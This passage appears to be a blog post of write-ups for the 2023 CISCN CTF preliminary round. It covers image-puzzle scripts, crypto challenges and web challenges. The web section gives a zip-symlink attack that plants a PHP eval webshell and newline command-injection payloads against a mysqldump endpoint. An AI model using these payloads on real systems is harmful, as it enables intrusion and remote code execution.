    <title>2023ciscn初赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023ciscn%E5%88%9D%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023ciscn%E5%88%9D%E8%B5%9Bwp.html</id>
    <published>2023-05-27T09:00:00.000Z</published>
    <updated>2023-06-01T07:50:51.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h2><p><code>print(open(&#39;/flag&#39;).read())</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E7%AD%BE%E5%88%B0%E5%8D%A1.png"></p><h2 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h2><p>追踪tcp流，数据提取出来base32</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-2.png"></p><h2 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h2><p>先分割<code>题目.png</code>中的小麻将到<code>output</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;题目.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure><p>再将<code>a.png</code>和<code>k.png</code>中的小麻将去<code>output</code>找对应的索引值，分别作为纵坐标和横坐标画图得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>python 沙盒</p><p>利用<code>_</code>拼接字符串后<code>eval</code>执行，同时限制了7位字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">Welcome to this python shell,<span class="hljs-keyword">try</span> to find the flag!<br>&gt;&gt;<span class="hljs-string">&#x27;open&#x27;</span><br><span class="hljs-string">&#x27;open&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;(&quot;/&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;fl&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/fl&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;ag&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;&quot;)&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;)&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;.&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;rea&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).rea&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;d()&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).read()&#x27;</span><br><br>&gt;&gt;<span class="hljs-built_in">eval</span>(_)<br><span class="hljs-string">&#x27;flag&#123;b8c3ead1-cdad-4ddb-bb81-9486888d426a&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>打开后有很多宽度不一样的小<code>bmp</code>文件，放进010里分析发现在冗余位多了一些数据</p><p>以<code>bfReserved1</code>表示图片左上角<code>x</code>坐标，<code>bfReserved2</code>表示图片左上角<code>y</code>坐标，<code>biXPelsPerMeter</code>表示图片右下角<code>x</code>坐标，<code>biYPelsPerMeter</code>表示图片右下角<code>y</code>坐标画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-2.png"></p><p>画的时候注意<code>biHeight</code>，在<code>bmp</code>中该值是正数说明图像是倒向的即图像存储是由下到上；该值是负数说明图像是倒向的即图像存储是由上到下，所以遇到负数的图片需要反转一下在拼图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">7200</span>,<span class="hljs-number">4000</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>)<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">38</span>:<span class="hljs-number">42</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">42</span>:<span class="hljs-number">46</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    If_rev = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(If_rev != <span class="hljs-number">100</span>):<br>        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)<br>    img.paste(pic,(Res1,Res2,Xpel,Ypel))<br>img.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拼完后的图跑<code>zsteg</code>，得到第一部分的flag：<code>flag&#123;f1R5T_part_1s_LSB_sTeG0_</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-3.png"></p><p>然后还是<code>biHeight</code>，高度-100的做0，100的做1，binary之后得到第二部分flag：<code>2nd_paRT_15_reVeRSe_bMp_</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Res1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res1_L.append(Res1)<br>    Res2_L.append(Res2)<br>    Ypel_L.append(Ypel)<br>    XY_L.append((Res2,Res1))<br>a = <span class="hljs-built_in">sorted</span>(Res1_L)<br>b = <span class="hljs-built_in">sorted</span>(Res2_L)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Ypel_L[ind] == <span class="hljs-number">4294967196</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-4.png"></p><p>第三部分在补齐字节的数据中<br>找到第一张图片<code>17447199634.bmp</code>，查看补齐字节的数据</p><p>发现依次是<code>FF D8</code>，<code>FF E1</code>等</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-5.png"></p><p>所以可以以<code>padding</code>数据按照左上到右下的顺序拼接得到<code>jpg</code>图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Xpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel_L.append(Xpel)<br>    XY_L.append((Res2,Res1))<br>    Leng_L.append((<span class="hljs-built_in">len</span>(f)-<span class="hljs-number">54</span>))<br>    Ypel_L.append(Ypel)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><br>Padding_file = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Leng_L[ind] != Xpel_L[ind]*<span class="hljs-number">300</span>):<br>        Padding_file.append(ind)<br><br>data = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Padding_file)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[Padding_file[i]]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    w = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    f = f[<span class="hljs-number">54</span>:]<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">100</span>):<br>        pad = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">200</span>):<br>        pad = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        pad = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        d = f[j*(w*<span class="hljs-number">3</span>+pad):j*(w*<span class="hljs-number">3</span>+pad)+w*<span class="hljs-number">3</span>+pad]<br>        data += d[-pad:]<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure><p>得到第三部分的flag：<code>3rd_parT_1s_paddINGINGING</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/flag.jpg"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发"></a>基于国密SM2算法的密钥密文分发</h2><p>根据文档一步一步来即可，虽然有点没看懂</p><p>先找个网址生成一组公钥和密钥 <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p><p>登录拿id</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-1.png"></p><p>上传公钥</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-2.png"></p><p>访问<code>/api/quantum</code>获取密钥密文</p><p>访问<code>/api/check</code>发送<code>quantumString</code>的值</p><p>使<code>quantumStringUser</code>的值等于<code>quantumStringServer</code>的值即可通过验证</p><p>访问<code>/api/search</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-3.png"></p><h2 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h2><p>非预期</p><p><code>/proc/22/task/22/environ</code>可以直接看到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%8F%AF%E4%BF%A1%E5%BA%A6%E9%87%8F.png"></p><h2 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h2><p>base64换表</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-Sign_in_passwd.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>上传后返回源码</p><p>只能上传<code>zip</code>文件，上传后在<code>tmp</code>目录使用<code>unzip -o</code>解压</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">//构造一个指向/var/www/html的软连接<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//保留软连接压缩<br>zip --symlinks test.zip poc<br><br>//创建跟第一个压缩包中目录同名的目录<br><span class="hljs-built_in">mkdir</span> poc<br><br>//接着向目录中写一个shell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//压缩这个目录<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure><p>上传第一个压缩包后会在<code>tmp</code>目录下生成一个软连接到<code>/var/www/html</code>，当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>根据题目描述可知分别有查询和导出的功能点</p><p>根据执行命令后的返回值推测执行的命令如下</p><p>传入<code>?db=a&amp;table_2_query=b</code>时会执行<code>select * from a.b</code><br>传入<code>?db=a&amp;table_2_dump=b</code>时会执行<code>mysqldump -u root a b &gt; log/xxx.log</code></p><p>这里因为<code>a</code>和<code>b</code>的值可控，所以相当于我们可以执行命令了</p><p>方法1：<br>直接传<code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>，然后访问<code>log/1</code></p><p>方法2：<br>因为<code>mysqldump</code>在找不到我们给出的表的情况下会抛出错误信息<code>mysqldump: Couldn&#39;t find table: &quot;表名&quot;</code></p><p>在<code>linux</code>中可以利用<code>2&gt;</code>将命令执行的结果输出到文件中</p><p>传<code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>，然后访问<code>1.php</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-dumpit-2.png"></p><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span 